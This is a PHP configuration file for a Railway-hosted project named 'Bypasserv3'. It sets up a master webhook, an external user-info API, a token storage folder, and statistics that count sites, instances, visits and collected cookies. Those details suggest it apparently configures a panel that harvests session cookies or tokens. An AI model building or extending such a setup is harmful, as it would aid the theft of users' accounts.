<?php
/**
 * Bypasserv3 - Configuration
 * Uses Railway environment variables
 */

if (!defined('CONFIG_LOADED')) {
    define('CONFIG_LOADED', true);
}

// Error handling
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/data/php_errors.log');

// Timezone
date_default_timezone_set('UTC');

// Base paths
define('BASE_PATH', __DIR__ . '/');
define('DATA_PATH', BASE_PATH . 'data/');
define('TEMPLATE_PATH', BASE_PATH . 'template/');

// Get configuration from Railway environment variables
define('MASTER_WEBHOOK', getenv('MASTER_WEBHOOK') ?: '');
define('EXTERNAL_API_URL', getenv('EXTERNAL_API_URL') ?: 'https://hyperblox.eu/controlPage/apis/userinfo.php');

// Validate required environment variables
if (empty(MASTER_WEBHOOK)) {
    error_log('WARNING: MASTER_WEBHOOK environment variable is not set!');
}

if (empty(EXTERNAL_API_URL)) {
    error_log('WARNING: EXTERNAL_API_URL environment variable is not set!');
}

// Rate limiting (can be overridden by env vars)
define('RATE_LIMIT_REQUESTS', getenv('RATE_LIMIT_REQUESTS') ?: 50);
define('RATE_LIMIT_WINDOW', getenv('RATE_LIMIT_WINDOW') ?: 3600);

// Session configuration
ini_set('session.cookie_httponly', 1);
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_secure', isset($_SERVER['HTTPS']) ? 1 : 0);
ini_set('session.cookie_samesite', 'Lax');

// Create required directories
$requiredPaths = [
    DATA_PATH,
    DATA_PATH . 'tokens/',
    DATA_PATH . 'instances/',
];

foreach ($requiredPaths as $path) {
    if (!is_dir($path)) {
        if (!mkdir($path, 0755, true)) {
            error_log('ERROR: Failed to create required directory: ' . $path);
        }
    }
}

// Validate .htaccess files exist
$htaccessFiles = [
    BASE_PATH . '.htaccess',
    DATA_PATH . '.htaccess',
    DATA_PATH . 'tokens/.htaccess'
];

foreach ($htaccessFiles as $file) {
    if (!file_exists($file)) {
        error_log('WARNING: Required .htaccess file missing: ' . $file);
    }
}

// Create global stats file if not exists
$globalStatsFile = DATA_PATH . 'global_stats.json';
if (!file_exists($globalStatsFile)) {
    $defaultStats = [
        'totalSites' => 0,
        'totalInstances' => 0,
        'totalCookies' => 0,
        'totalVisits' => 0,
        'lastUpdated' => time()
    ];
    file_put_contents($globalStatsFile, json_encode($defaultStats, JSON_PRETTY_PRINT));
}

// Security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

// Railway-specific detection
$isRailway = getenv('RAILWAY_ENVIRONMENT') !== false;
if ($isRailway) {
    define('IS_RAILWAY', true);
    define('RAILWAY_ENV', getenv('RAILWAY_ENVIRONMENT'));
    define('RAILWAY_SERVICE', getenv('RAILWAY_SERVICE_NAME') ?: 'bypasserv3');
} else {
    define('IS_RAILWAY', false);
}

?>
